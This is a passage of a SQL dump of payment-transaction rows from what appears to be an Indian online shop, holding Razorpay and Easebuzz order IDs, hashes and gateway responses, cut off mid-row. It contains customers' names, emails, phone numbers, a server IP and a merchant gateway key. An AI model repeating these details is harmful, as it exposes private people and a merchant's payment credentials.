(66, '2651119', 'order_J4zHkb0DS4hFwZ', 3600, '{\"txnid\":\"c7636ab7ab699756a7a3\",\"user_id\":\"5\",\"user_name\":\"AshwinH\",\"emailid\":\"ashwin@savithru.com\",\"tot_qty\":17,\"total_amt\":\"3550.0\",\"coupon_code\":\"\",\"discount\":\"0.00\",\"saved_amt\":\"1000\",\"devilery_charge\":\"50\",\"total_amt_paid\":\"3600.00\",\"delivery_days\":\"4\",\"ordered_date\":\"2022-03-09 17:47:11\",\"delivery_date\":\"2022-03-13\",\"status\":2,\"paymode\":\"razor\",\"taxamount\":\"0.00\",\"pincode\":\"560010\",\"randid\":92214813,\"discount_per\":\"00\"}', '2022-03-09 17:47:11', '2022-03-09 12:17:11', -1, '', '', '', '', 123, '', '', ''),
(67, '23948365980', 'order_J5jKIKVQz2cHqS', 420, '', '2022-03-11 14:50:03', '2022-03-11 09:20:03', 1, 'pay_J5jKnxhFUI0t38', '2b0104e5ff4eb39f48d0ba0972de91911001a658843a22cd60c439d000dd75a5', 'success', '', 124, '', '', ''),
(68, '85683378431', 'order_J62poYFBu2vf0R', 4000, '', '2022-03-12 09:55:05', '2022-03-12 04:25:05', 1, 'pay_J62qLXtpDVUvkn', '332656ba56cb876d907b59eeacf1ab96348761e90f08cf7531dc9f578f847657', 'success', '', 126, '', '', ''),
(69, '89233659737', 'order_J86OS5pQkFNNDF', 1380, '', '2022-03-17 14:41:51', '2022-03-17 09:11:51', 1, 'pay_J86OpGgfQ0zev7', '2563ec3f0d212501a73ba89e21f96f346e5aad5e037109fde0b369051b0f29f7', 'success', '', 129, '', '', ''),
(70, '4073748720', 'order_J8RdLFtFgAS21p', 1050, '', '2022-03-18 11:32:57', '2022-03-18 06:02:57', 1, 'pay_J8ReVgPlQiGuvs', '146afa413e1d18e0aed84d90af2848bdd6b0f0889f2a8500f5a4ca95396cebf7', 'success', '', 130, '', '', ''),
(71, '77452867122', 'order_JArlY59Sm7V3Dx', 125, '', '2022-03-24 14:20:53', '2022-03-24 08:50:53', 1, 'pay_JArmYfgqRodvnk', '2f9ab4f42460cc93bc10b9f1a63badc17dc2d9b251e8f9bf8c76b15d57079d7c', 'success', '', 136, '', '', ''),
(72, '41787193882', 'order_JArq674mLtnbpJ', 216, '', '2022-03-24 14:24:43', '2022-03-24 08:54:43', 1, 'pay_JArqZh7Cv5K0yl', 'fb403e9829edf44b7cf0b9aab55383a84d8d7a2edbf335b7fe5d76184d67714f', 'success', '', 137, '', '', ''),
(73, '61870657536', 'order_JAs2bactAx7TwV', 400, '', '2022-03-24 14:36:31', '2022-03-24 09:06:31', 1, 'pay_JAs33wMHg1stfu', '92aecb4188725d1578b28498cbaf595182612f6c2df99543eac5ddac72608269', 'success', '', 139, '', '', ''),
(74, '78867010156', '', 595, '', '2022-03-24 15:22:37', '2022-03-24 09:52:37', -1, '', '', 'pending', '', 142, '', '', ''),
(75, '50979474541', '', 2591, '', '2022-03-25 15:29:09', '2022-03-25 09:59:09', -1, '', '', 'pending', '', 143, '', '', ''),
(76, '8888441099', '', 900, '', '2022-03-25 17:25:17', '2022-03-25 11:55:17', -1, '', '', 'pending', '', 144, '', '', ''),
(77, '38228101745', 'order_JBMq7FxzY1x7Ve', 700, '', '2022-03-25 20:44:15', '2022-03-25 15:14:15', 1, 'pay_JBMqcx1U28gGk1', 'e936479ca1f623c0ff85cd9e0a2cae790a66b88ac8411bf53a639ee8474371c1', 'success', '', 145, '', '', ''),
(78, '86957341217', '', 200, '', '2022-03-25 20:45:00', '2022-03-25 15:15:00', -1, '', '', 'pending', '', 146, '', '', ''),
(79, '70141859168', 'order_JBbDbgzE9O61Um', 3400, '', '2022-03-26 10:47:56', '2022-03-26 05:17:56', 1, 'pay_JBbDqRVx5UMdqY', '4a1acbd1a707f9b5b14e81f27675c6916256a906ceeb656f8d588a110f8f91be', 'success', '', 147, '', '', ''),
(80, '67154006128', '', 935, '', '2022-03-26 10:53:40', '2022-03-26 05:23:40', -1, '', '', 'pending', '', 148, '', '', ''),
(81, '55577677364', '', 200, '', '2022-03-28 10:25:33', '2022-03-28 04:55:33', -1, '', '', 'pending', '', 149, '', '', ''),
(82, '9657022', '', 225, '', '2022-03-29 16:24:12', '2022-03-29 10:54:12', -1, '', '', '', '', 150, '', '', ''),
(83, '6970807', '', 225, '', '2022-03-29 16:24:30', '2022-03-29 10:54:30', -1, '', '', '', '', 151, '', '', ''),
(84, '6860426', '', 225, '', '2022-03-29 16:26:30', '2022-03-29 10:56:30', -1, '', '', '', '', 152, '', '', ''),
(85, '7786950', '', 225, '', '2022-03-29 17:31:07', '2022-03-29 12:01:07', -1, '', '', '', '', 153, '', '', ''),
(86, '3116254', '', 225, '', '2022-03-29 17:32:00', '2022-03-29 12:02:00', -1, '', '', '', '', 154, '', '', ''),
(87, '3459819', '', 225, '', '2022-04-04 10:53:47', '2022-04-04 05:23:47', -1, '', '', '', '', 155, '', '', ''),
(88, '1392812', '', 225, '', '2022-04-04 10:55:21', '2022-04-04 05:25:21', -1, '', '', '', '', 156, '', '', ''),
(89, '1891087', '', 225, '', '2022-04-04 10:58:43', '2022-04-04 05:28:43', -1, '', '', '', '', 157, '', '', ''),
(90, '7238462', '', 225, '', '2022-04-04 10:59:09', '2022-04-04 05:29:09', -1, '', '', '', '', 158, '', '', ''),
(91, '6501795', '', 225, '', '2022-04-04 10:59:27', '2022-04-04 05:29:27', -1, '', '', '', '', 159, '', '', ''),
(92, '5614732', '', 225, '', '2022-04-04 11:00:33', '2022-04-04 05:30:33', -1, '', '', '', '', 160, '', '', ''),
(93, '3439311', '', 225, '', '2022-04-04 11:12:53', '2022-04-04 05:42:53', -1, '', '', '', '', 161, '', '', ''),
(94, '9107605', '', 225, '', '2022-04-04 11:22:32', '2022-04-04 05:52:32', -1, '', '', '', '', 162, '', '', ''),
(95, '70749794530', 'order_JG26A1MSR2ewrQ', 900, '', '2022-04-06 15:41:36', '2022-04-06 10:11:36', 1, 'pay_JG26N0Psx7F3T4', 'c29b188e74907daa707008417a2a79117bbd46a9e295457de40eb790d641b3fc', 'success', '', 1, '', '', ''),
(96, '11590957705', '', 1455, '', '2022-04-06 15:42:56', '2022-04-06 10:12:56', -1, '', '', 'pending', '', 2, '', '', ''),
(97, '5176342', '', 270, '', '2022-04-07 15:06:27', '2022-04-07 09:36:27', -1, '', '', '', '', 3, '', '', ''),
(98, '46624640524', '', 350, '', '2022-04-08 11:25:38', '2022-04-08 05:55:38', -1, '', '', 'pending', '', 4, '', '', ''),
(99, '2674792', '', 274, '', '2022-04-08 12:07:19', '2022-04-08 06:37:19', -1, '', '', '', '', 5, '', '', ''),
(100, '60464556592', '', 452, '', '2022-04-09 14:33:20', '2022-04-09 09:03:20', -1, '', '', 'pending', '', 6, '', '', ''),
(101, '14611824574', '', 581, '', '2022-04-11 11:58:26', '2022-04-11 06:28:26', -1, '', '', 'pending', '', 8, '', '', ''),
(102, '7378751', '', 274, '', '2022-04-11 14:19:25', '2022-04-11 08:49:25', -1, '', '', '', '', 10, '', '', ''),
(103, '7876838', '', 274, '', '2022-04-11 14:22:25', '2022-04-11 08:52:25', -1, '', '', '', '', 11, '', '', ''),
(104, '5579174', 'order_JHzdRWMaNZami1', 330, '{\"txnid\":\"22379bfd389fe5e8a030\",\"user_id\":\"5\",\"user_name\":\"AshwinH\",\"emailid\":\"ashwin@savithru.com\",\"tot_qty\":1,\"total_amt\":\"250\",\"coupon_code\":\"\",\"discount\":\"\",\"saved_amt\":\"\",\"devilery_charge\":\"50\",\"total_amt_paid\":\"330\",\"delivery_days\":\"4\",\"ordered_date\":\"2022-04-11 14:34:44\",\"delivery_date\":\"2022-04-15\",\"status\":2,\"paymode\":\"Online\",\"taxamount\":\"30\",\"pincode\":\"560010\",\"randid\":20965713,\"discount_per\":\"\"}', '2022-04-11 14:34:45', '2022-04-11 09:04:45', -1, 'pay_JHzduAZZ23nEYL', '435820f0251f467e62110ce78b1c5accf6942146a783ad383a8b995e6b7f3401', 'success', '', 12, '', '', ''),
(105, '5644313', '', 1636, '', '2022-04-11 15:20:51', '2022-04-11 09:50:51', -1, '', '', '', '', 13, '', '', ''),
(106, '81603090283', '', 162, '', '2022-04-11 15:48:49', '2022-04-11 10:18:49', -1, '', '', 'pending', '', 14, '', '', ''),
(107, '1173618', 'order_JI2ypwoc3EgrIG', 274, '{\"txnid\":\"f52083f83781a60c490d\",\"user_id\":\"28\",\"user_name\":\"PrathamA\",\"emailid\":\"pratham@napdesigns.com\",\"tot_qty\":1,\"total_amt\":\"200.0\",\"coupon_code\":\"\",\"discount\":\"0.00\",\"saved_amt\":\"\",\"devilery_charge\":\"50\",\"total_amt_paid\":\"274.00\",\"delivery_days\":\"4\",\"ordered_date\":\"2022-04-11 17:51:04\",\"delivery_date\":\"2022-04-15\",\"status\":2,\"paymode\":\"Online\",\"taxamount\":\"24.00\",\"pincode\":\"560022\",\"randid\":76024933,\"discount_per\":\"00\"}', '2022-04-11 17:51:05', '2022-04-11 12:21:05', -1, '', '', '', '', 15, '', '', ''),
(108, '45123458046', 'order_JWJoP48FisGnNx', 1240, '', '2022-05-17 19:26:08', '2022-05-17 13:56:08', 1, 'pay_JWJpUm7saEqCt8', '69c47f291ba7594c945f24230718712e01734017bed1f6f3ac39ba56b6b43a9a', 'success', '', 17, '', '', ''),
(109, '80395379799', '', 1250, '', '2022-06-01 14:49:26', '2022-06-01 09:19:26', -1, '', '', 'pending', '', 18, '', '', ''),
(110, '21028470074', '', 585, '', '2022-06-01 15:31:37', '2022-06-01 10:01:37', -1, '', '', 'pending', '', 19, '', '', ''),
(111, '17624036455', '', 450, '', '2022-06-01 15:34:45', '2022-06-01 10:04:45', -1, '', '', 'pending', '', 20, '', '', ''),
(112, '1926490', 'order_JwHRxPUEMM1EMt', 374, '{\"txnid\":\"cbdd90a8721a442edf21\",\"user_id\":\"5\",\"user_name\":\"AshwinH\",\"emailid\":\"ashwin@savithru.com\",\"tot_qty\":2,\"total_amt\":\"300.0\",\"coupon_code\":\"\",\"discount\":\"0.00\",\"saved_amt\":\"\",\"devilery_charge\":\"50\",\"total_amt_paid\":\"374.00\",\"delivery_days\":\"4\",\"ordered_date\":\"2022-07-22 10:00:25\",\"delivery_date\":\"2022-07-26\",\"status\":2,\"paymode\":\"Online\",\"taxamount\":\"24.00\",\"pincode\":\"560010\",\"randid\":15465430,\"discount_per\":\"00\"}', '2022-07-22 10:00:26', '2022-07-22 04:30:26', -1, '', '', '', '', 21, '', '', ''),
(113, '9242111', 'order_JwHUWBtlwVli95', 374, '{\"txnid\":\"9fc57f58454fbd23cd1b\",\"user_id\":\"5\",\"user_name\":\"AshwinH\",\"emailid\":\"ashwin@savithru.com\",\"tot_qty\":2,\"total_amt\":\"300.0\",\"coupon_code\":\"\",\"discount\":\"0.00\",\"saved_amt\":\"\",\"devilery_charge\":\"50\",\"total_amt_paid\":\"374.00\",\"delivery_days\":\"4\",\"ordered_date\":\"2022-07-22 10:02:51\",\"delivery_date\":\"2022-07-26\",\"status\":2,\"paymode\":\"Online\",\"taxamount\":\"24.00\",\"pincode\":\"560010\",\"randid\":92322630,\"discount_per\":\"00\"}', '2022-07-22 10:02:51', '2022-07-22 04:32:51', -1, '', '', '', '', 22, '', '', ''),
(114, '8574337', 'order_JwHcAcN4ZW7Ulp', 374, '{\"txnid\":\"39af5203f84287d3c1c6\",\"user_id\":\"5\",\"user_name\":\"AshwinH\",\"emailid\":\"ashwin@savithru.com\",\"tot_qty\":2,\"total_amt\":\"300.0\",\"coupon_code\":\"\",\"discount\":\"0.00\",\"saved_amt\":\"\",\"devilery_charge\":\"50\",\"total_amt_paid\":\"374.00\",\"delivery_days\":\"4\",\"ordered_date\":\"2022-07-22 10:10:05\",\"delivery_date\":\"2022-07-26\",\"status\":2,\"paymode\":\"Online\",\"taxamount\":\"24.00\",\"pincode\":\"560010\",\"randid\":78200399,\"discount_per\":\"00\"}', '2022-07-22 10:10:06', '2022-07-22 04:40:06', -1, '', '', '', '', 23, '', '', ''),
(115, '1340108354', '', 168, '', '2022-07-22 14:25:34', '2022-07-22 08:55:34', -1, '', '', 'pending', '', 24, '', '', ''),
(116, '11446460407', '', 268, '', '2022-07-30 11:28:04', '2022-07-30 05:58:04', -1, '', '', 'pending', '', 25, '', '', ''),
(119, '40136508391', '', 50, '', '2022-08-01 12:24:35', '2022-08-01 06:54:35', 1, 'TDYKUQIK7R', 'd78d3bdd6e5927d893407f5253a7ade5cf56f5783c32312007826b379a481fc9d7f8b65d39052df65e4e245d1f9ba0851891', 'success', '', 40, '', '', ''),
(120, '78139889260', '', 33600, '{\"name_on_card\":\"NA\",\"bank_ref_num\":\"33600.0\",\"udf3\":\"\",\"hash\":\"695f0ffff82d60366e41e8c83e1b19a79073bfe046803de7becc71ea27b616050de106c28b7b1aac5bc5ae3eab1cf5e12611ce1be9a936fdd65001b717eb9abf\",\"firstname\":\"syed afroz\",\"net_amount_debit\":\"33600.0\",\"payment_source\":\"Easebuzz\",\"surl\":\"http:\\/\\/13.235.149.175\\/cart\\/razorpayResponse\\/41\",\"error_Message\":\"PGS10001-Success\",\"issuing_bank\":\"NA\",\"cardCategory\":\"NA\",\"phone\":\"7090099999\",\"easepayid\":\"T6XJ0EV37I\",\"cardnum\":\"NA\",\"key\":\"2PBP7IABZ2\",\"udf8\":\"\",\"unmappedstatus\":\"NA\",\"PG_TYPE\":\"NA\",\"addedon\":\"2022-08-01 07:01:50\",\"cash_back_percentage\":\"50.0\",\"status\":\"success\",\"udf1\":\"\",\"merchant_logo\":\"NA\",\"udf6\":\"\",\"udf10\":\"\",\"txnid\":\"Test52\",\"productinfo\":\"For test\",\"furl\":\"http:\\/\\/13.235.149.175\\/cart\\/order_failure\",\"card_type\":\"Debit Card\",\"amount\":\"33600.0\",\"udf2\":\"\",\"udf5\":\"\",\"mode\":\"DC\",\"udf7\":\"\",\"error\":\"NA\",\"udf9\":\"\",\"bankcode\":\"NA\",\"deduction_percentage\":\"2.30\",\"email\":\"developerweb50@gmail.com\",\"udf4\":\"\"}', '2022-08-01 12:32:33', '2022-08-01 07:02:33', 1, 'T6XJ0EV37I', '695f0ffff82d60366e41e8c83e1b19a79073bfe046803de7becc71ea27b616050de106c28b7b1aac5bc5ae3eab1cf5e12611', 'success', '', 41, '', '', ''),
(121, '73011711112', '', 468, '{\"name_on_card\":\"NA\",\"bank_ref_num\":\"468.0\",\"udf3\":\"\",\"hash\":\"44b1929af1dc77d6fde73657747889c23219cce56c99ebc176893f6ed54bd42a9d4b03cac3f901d0f9c96347203b94c1a29b0e1b3760b50cba9b6b70d31cb58d\",\"firstname\":\"syed afroz\",\"net_amount_debit\":\"468.0\",\"payment_source\":\"Easebuzz\",\"surl\":\"http:\\/\\/13.235.149.175\\/cart\\/razorpayResponse\\/52\",\"error_Message\":\"PGS10001-Success\",\"issuing_bank\":\"NA\",\"cardCategory\":\"NA\",\"phone\":\"7090099999\",\"easepayid\":\"TP5VFKTC4U\",\"cardnum\":\"NA\",\"key\":\"2PBP7IABZ2\",\"udf8\":\"\",\"unmappedstatus\":\"NA\",\"PG_TYPE\":\"NA\",\"addedon\":\"2022-08-01 07:12:08\",\"cash_back_percentage\":\"50.0\",\"status\":\"success\",\"udf1\":\"\",\"merchant_logo\":\"NA\",\"udf6\":\"\",\"udf10\":\"\",\"txnid\":\"Test80\",\"productinfo\":\"For test\",\"furl\":\"http:\\/\\/13.235.149.175\\/cart\\/order_failure\",\"card_type\":\"Debit Card\",\"amount\":\"468.0\",\"udf2\":\"\",\"udf5\":\"\",\"mode\":\"DC\",\"udf7\":\"\",\"error\":\"NA\",\"udf9\":\"\",\"bankcode\":\"NA\",\"deduction_percentage\":\"2.30\",\"email\":\"developerweb50@gmail.com\",\"udf4\":\"\"}', '2022-08-01 12:43:02', '2022-08-01 07:13:02', 1, 'TP5VFKTC4U', '44b1929af1dc77d6fde73657747889c23219cce56c99ebc176893f6ed54bd42a9d4b03cac3f901d0f9c96347203b94c1a29b', 'success', '', 52, '', '', ''),
(122, '21417490946', '', 890, '', '2022-08-01 16:22:46', '2022-08-01 10:52:46', -1, '', '', 'pending', '', 53, '', '', ''),
(123, '71122168760', '', 536, '', '2022-08-01 16:33:27', '2022-08-01 11:03:27', -1, '', '', 'pending', '', 54, '', '', ''),
(124, '26618639558', '', 772, '', '2022-08-01 16:43:57', '2022-08-01 11:13:57', -1, '', '', 'pending', '', 55, '', '', ''),
(125, '91441558472', '', 872, '{\"name_on_card\":\"NA\",\"bank_ref_num\":\"872.0\",\"udf3\":\"\",\"hash\":\"3039228222bf4bd1ff8e25b9697645e93df2c10e9926505df957d2d857e237c0994214098d1fe200153287cf6be31f7ae8928c3937a9242f8d5039c54f6b6b4c\",\"firstname\":\"syed afroz\",\"net_amount_debit\":\"872.0\",\"payment_source\":\"Easebuzz\",\"surl\":\"http:\\/\\/13.235.149.175\\/cart\\/razorpayResponse\\/56\",\"error_Message\":\"PGS10001-Success\",\"issuing_bank\":\"NA\",\"cardCategory\":\"NA\",\"phone\":\"7090099999\",\"easepayid\":\"TUTTLMVX1R\",\"cardnum\":\"NA\",\"key\":\"2PBP7IABZ2\",\"udf8\":\"\",\"unmappedstatus\":\"NA\",\"PG_TYPE\":\"NA\",\"addedon\":\"2022-08-01 11:17:57\",\"cash_back_percentage\":\"50.0\",\"status\":\"success\",\"udf1\":\"\",\"merchant_logo\":\"NA\",\"udf6\":\"\",\"udf10\":\"\",\"txnid\":\"Test44\",\"productinfo\":\"For test\",\"furl\":\"http:\\/\\/13.235.149.175\\/cart\\/order_failure\",\"card_type\":\"Debit Card\",\"amount\":\"872.0\",\"udf2\":\"\",\"udf5\":\"\",\"mode\":\"DC\",\"udf7\":\"\",\"error\":\"NA\",\"udf9\":\"\",\"bankcode\":\"NA\",\"deduction_percentage\":\"2.30\",\"email\":\"developerweb50@gmail.com\",\"udf4\":\"\"}', '2022-08-01 16:49:04', '2022-08-01 11:19:04', 1, 'TUTTLMVX1R', '3039228222bf4bd1ff8e25b9697645e93df2c10e9926505df957d2d857e237c0994214098d1fe200153287cf6be31f7ae892', 'success', '', 56, '', '', ''),
(126, '64733201736', '', 772, '{\"name_on_card\":\"NA\",\"bank_ref_num\":\"772.0\",\"udf3\":\"\",\"hash\":\"70737d32d9ff0e7f34500843dce5ce72d505fc1e76871f80bdb7f5644aa67b38ae8fdb5c22673c0e4daeaf40f78c03fa5b9752db7f4feb07e1cf207a528b76cb\",\"firstname\":\"syed afroz\",\"net_amount_debit\":\"772.0\",\"payment_source\":\"Easebuzz\",\"surl\":\"http:\\/\\/13.235.149.175\\/cart\\/razorpayResponse\\/57\",\"error_Message\":\"PGS10001-Success\",\"issuing_bank\":\"NA\",\"cardCategory\":\"NA\",\"phone\":\"7090099999\",\"easepayid\":\"TPE5BBE4FI\",\"cardnum\":\"NA\",\"key\":\"2PBP7IABZ2\",\"udf8\":\"\",\"unmappedstatus\":\"NA\",\"PG_TYPE\":\"NA\",\"addedon\":\"2022-08-01 14:33:15\",\"cash_back_percentage\":\"50.0\",\"status\":\"success\",\"udf1\":\"\",\"merchant_logo\":\"NA\",\"udf6\":\"\",\"udf10\":\"\",\"txnid\":\"Test3\",\"productinfo\":\"For test\",\"furl\":\"http:\\/\\/13.235.149.175\\/cart\\/order_failure\",\"card_type\":\"Debit Card\",\"amount\":\"772.0\",\"udf2\":\"\",\"udf5\":\"\",\"mode\":\"DC\",\"udf7\":\"\",\"error\":\"NA\",\"udf9\":\"\",\"bankcode\":\"NA\",\"deduction_percentage\":\"2.30\",\"email\":\"developerweb50@gmail.com\",\"udf4\":\"\"}', '2022-08-01 20:04:32', '2022-08-01 14:34:32', 1, 'TPE5BBE4FI', '70737d32d9ff0e7f34500843dce5ce72d505fc1e76871f80bdb7f5644aa67b38ae8fdb5c22673c0e4daeaf40f78c03fa5b97', 'success', '', 57, '', '', ''),
(127, '40234084934', '', 536, '{\"name_on_card\":\"NA\",\"bank_ref_num\":\"536.0\",\"udf3\":\"\",\"hash\":\"1734b4157bc9b1bb43101f6b1ff0222670b762f655a76e80967b9bec470bda1536536e5b2e8e8cbd2ed98ffc2d5cece7934f5c22ee64a0de8b7bf915c23e8514\",\"firstname\":\"syed afroz\",\"net_amount_debit\":\"536.0\",\"payment_source\":\"Easebuzz\",\"surl\":\"https:\\/\\/www.gogarbha.com\\/cart\\/razorpayResponse\\/58\",\"error_Message\":\"PGS10001-Success\",\"issuing_bank\":\"NA\",\"cardCategory\":\"NA\",\"phone\":\"7090099999\",\"easepayid\":\"TNMQETI6FV\",\"cardnum\":\"NA\",\"key\":\"2PBP7IABZ2\",\"udf8\":\"\",\"unmappedstatus\":\"NA\",\"PG_TYPE\":\"NA\",\"addedon\":\"2022-08-01 14:41:24\",\"cash_back_percentage\":\"50.0\",\"status\":\"success\",\"udf1\":\"\",\"merchant_logo\":\"NA\",\"udf6\":\"\",\"udf10\":\"\",\"txnid\":\"Test42\",\"productinfo\":\"For test\",\"furl\":\"https:\\/\\/www.gogarbha.com\\/cart\\/order_failure\",\"card_type\":\"Debit Card\",\"amount\":\"536.0\",\"udf2\":\"\",\"udf5\":\"\",\"mode\":\"DC\",\"udf7\":\"\",\"error\":\"NA\",\"udf9\":\"\",\"bankcode\":\"NA\",\"deduction_percentage\":\"2.30\",\"email\":\"developerweb50@gmail.com\",\"udf4\":\"\"}', '2022-08-01 20:11:55', '2022-08-01 14:41:55', 1, 'TNMQETI6FV', '1734b4157bc9b1bb43101f6b1ff0222670b762f655a76e80967b9bec470bda1536536e5b2e8e8cbd2ed98ffc2d5cece7934f', 'success', '', 58, '', '', ''),
(128, '31638394881', '', 522, '{\"name_on_card\":\"NA\",\"bank_ref_num\":\"522.0\",\"udf3\":\"\",\"hash\":\"62a5df649a4c3ef1efeafed0406ab222ef77dea9ac7154cec69255bfbb54589f3e02026e67ad6e781b2676af7609e8419eb975d1c6d222eab89295a208fe7037\",\"firstname\":\"suresh\",\"net_amount_debit\":\"522.0\",\"payment_source\":\"Easebuzz\",\"surl\":\"https:\\/\\/www.gogarbha.com\\/cart\\/razorpayResponse\\/59\",\"error_Message\":\"PGS10001-Success\",\"issuing_bank\":\"NA\",\"cardCategory\":\"NA\",\"phone\":\"9845324064\",\"easepayid\":\"T2GRL8CFKR\",\"cardnum\":\"NA\",\"key\":\"2PBP7IABZ2\",\"udf8\":\"\",\"unmappedstatus\":\"NA\",\"PG_TYPE\":\"NA\",\"addedon\":\"2022-08-01 14:46:21\",\"cash_back_percentage\":\"50.0\",\"status\":\"success\",\"udf1\":\"\",\"merchant_logo\":\"NA\",\"udf6\":\"\",\"udf10\":\"\",\"txnid\":\"Test68\",\"productinfo\":\"For test\",\"furl\":\"https:\\/\\/www.gogarbha.com\\/cart\\/order_failure\",\"card_type\":\"Debit Card\",\"amount\":\"522.0\",\"udf2\":\"\",\"udf5\":\"\",\"mode\":\"DC\",\"udf7\":\"\",\"error\":\"NA\",\"udf9\":\"\",\"bankcode\":\"NA\",\"deduction_percentage\":\"2.30\",\"email\":\"gvsuresh@savithru.com\",\"udf4\":\"\"}', '2022-08-01 20:20:15', '2022-08-01 14:50:15', 1, 'T2GRL8CFKR', '62a5df649a4c3ef1efeafed0406ab222ef77dea9ac7154cec69255bfbb54589f3e02026e67ad6e781b2676af7609e8419eb9', 'success', '', 59, '', '', ''),
(129, '50611026528', '', 130, '{\"name_on_card\":\"NA\",\"bank_ref_num\":\"130.0\",\"udf3\":\"\",\"hash\":\"00ca201d481e9046f684e9db5816202caf1fd2b2be836a32ed0b2b2abe8dceaa479c219e8732be3ce0343a39e66ff185d957913741082b3580249789f12b42cf\",\"firstname\":\"suresh\",\"net_amount_debit\":\"130.0\",\"payment_source\":\"Easebuzz\",\"surl\":\"https:\\/\\/www.gogarbha.com\\/cart\\/razorpayResponse\\/60\",\"error_Message\":\"PGS10001-Success\",\"issuing_bank\":\"NA\",\"cardCategory\":\"NA\",\"phone\":\"9845324064\",\"easepayid\":\"T6M9X7BTOM\",\"cardnum\":\"NA\",\"key\":\"2PBP7IABZ2\",\"udf8\":\"\",\"unmappedstatus\":\"NA\",\"PG_TYPE\":\"NA\",\"addedon\":\"2022-08-01 16:10:51\",\"cash_back_percentage\":\"50.0\",\"status\":\"success\",\"udf1\":\"\",\"merchant_logo\":\"NA\",\"udf6\":\"\",\"udf10\":\"\",\"txnid\":\"Test96\",\"productinfo\":\"For test\",\"furl\":\"https:\\/\\/www.gogarbha.com\\/cart\\/order_failure\",\"card_type\":\"Debit Card\",\"amount\":\"130.0\",\"udf2\":\"\",\"udf5\":\"\",\"mode\":\"DC\",\"udf7\":\"\",\"error\":\"NA\",\"udf9\":\"\",\"bankcode\":\"NA\",\"deduction_percentage\":\"2.30\",\"email\":\"gvsuresh@savithru.com\",\"udf4\":\"\"}', '2022-08-01 21:44:50', '2022-08-01 16:14:50', 1, 'T6M9X7BTOM', '00ca201d481e9046f684e9db5816202caf1fd2b2be836a32ed0b2b2abe8dceaa479c219e8732be3ce0343a39e66ff185d957', 'success', '', 60, '', '', ''),
(130, '13425911162', '', 536, '{\"name_on_card\":\"NA\",\"bank_ref_num\":\"536.0\",\"udf3\":\"\",\"hash\":\"99768d33b2e96dae67528d37da05c32623f7eaeb0c8d8a3c5abbc898104535db9d04a4c979e7ecf18b23ba937b3fc778cbf0b3c0d0e51c67085c98d15805e6c7\",\"firstname\":\"syed afroz\",\"net_amount_debit\":\"536.0\",\"payment_source\":\"Easebuzz\",\"surl\":\"https:\\/\\/www.gogarbha.com\\/cart\\/razorpayResponse\\/61\",\"error_Message\":\"PGS10001-Success\",\"issuing_bank\":\"NA\",\"cardCategory\":\"NA\",\"phone\":\"7090099999\",\"easepayid\":\"T6N9OPE69F\",\"cardnum\":\"NA\",\"key\":\"2PBP7IABZ2\",\"udf8\":\"\",\"unmappedstatus\":\"NA\",\"PG_TYPE\":\"NA\",\"addedon\":\"2022-08-02 04:49:52\",\"cash_back_percentage\":\"50.0\",\"status\":\"success\",\"udf1\":\"\",\"merchant_logo\":\"NA\",\"udf6\":\"\",\"udf10\":\"\",\"txnid\":\"Test96\",\"productinfo\":\"For test\",\"furl\":\"https:\\/\\/www.gogarbha.com\\/cart\\/order_failure\\/61\",\"card_type\":\"Debit Card\",\"amount\":\"536.0\",\"udf2\":\"\",\"udf5\":\"\",\"mode\":\"DC\",\"udf7\":\"\",\"error\":\"NA\",\"udf9\":\"\",\"bankcode\":\"NA\",\"deduction_percentage\":\"2.30\",\"email\":\"developerweb50@gmail.com\",\"udf4\":\"\"}', '2022-08-02 10:20:56', '2022-08-02 04:50:56', 1, 'T6N9OPE69F', '99768d33b2e96dae67528d37da05c32623f7eaeb0c8d8a3c5abbc898104535db9d04a4c979e7ecf18b23ba937b3fc778cbf0', 'success', '', 61, '', '', ''),
(131, '2939237654', '', 536, '{\"name_on_card\":\"NA\",\"bank_ref_num\":\"536.0\",\"udf3\":\"\",\"hash\":\"4c658e275638644a561f69ce8412789084806196897c5b60a022cbcab16f189e54e4698eaf6a2446ed1e2062a715affc95476b6c26e501a77f9aa8731e7ed617\",\"firstname\":\"ran\",\"net_amount_debit\":\"536.0\",\"payment_source\":\"Easebuzz\",\"surl\":\"https:\\/\\/www.gogarbha.com\\/cart\\/razorpayResponse\\/62\",\"error_Message\":\"PGS10001-Success\",\"issuing_bank\":\"NA\",\"cardCategory\":\"NA\",\"phone\":\"7090099999\",\"easepayid\":\"T5TKT2SBOD\",\"cardnum\":\"NA\",\"key\":\"2PBP7IABZ2\",\"udf8\":\"\",\"unmappedstatus\":\"NA\",\"PG_TYPE\":\"NA\",\"addedon\":\"2022-08-02 05:02:17\",\"cash_back_percentage\":\"50.0\",\"status\":\"success\",\"udf1\":\"\",\"merchant_logo\":\"NA\",\"udf6\":\"\",\"udf10\":\"\",\"txnid\":\"Test88\",\"productinfo\":\"For test\",\"furl\":\"https:\\/\\/www.gogarbha.com\\/cart\\/order_failure\\/62\",\"card_type\":\"Debit Card\",\"amount\":\"536.0\",\"udf2\":\"\",\"udf5\":\"\",\"mode\":\"DC\",\"udf7\":\"\",\"error\":\"NA\",\"udf9\":\"\",\"bankcode\":\"NA\",\"deduction_percentage\":\"2.30\",\"email\":\"ran@savithru.com\",\"udf4\":\"\"}', '2022-08-02 10:37:17', '2022-08-02 05:07:17', 1, 'T5TKT2SBOD', '4c658e275638644a561f69ce8412789084806196897c5b60a022cbcab16f189e54e4698eaf6a2446ed1e2062a715affc9547', 'success', '', 62, '', '', ''),
(132, '14793669029', '', 1126, '', '2022-08-02 10:45:43', '2022-08-02 05:15:43', -1, '', '', 'pending', '', 63, '', '', ''),
(133, '35355336560', '', 972, '{\"name_on_card\":\"NA\",\"bank_ref_num\":\"972.0\",\"udf3\":\"\",\"hash\":\"b75c2db44087e74965b829c58d389e332ae7073e8c0a5eb6c3eaf5246c6abc67ca791dc084989a241cdd89837bf21bf0073d88cf0247f17f76c70682184adf31\",\"firstname\":\"syed afroz\",\"net_amount_debit\":\"972.0\",\"payment_source\":\"Easebuzz\",\"surl\":\"https:\\/\\/www.gogarbha.com\\/cart\\/razorpayResponse\\/64\",\"error_Message\":\"PGS10001-Success\",\"issuing_bank\":\"NA\",\"cardCategory\":\"NA\",\"phone\":\"7090099999\",\"easepayid\":\"TRETIIGRIJ\",\"cardnum\":\"NA\",\"key\":\"2PBP7IABZ2\",\"udf8\":\"\",\"unmappedstatus\":\"NA\",\"PG_TYPE\":\"NA\",\"addedon\":\"2022-08-02 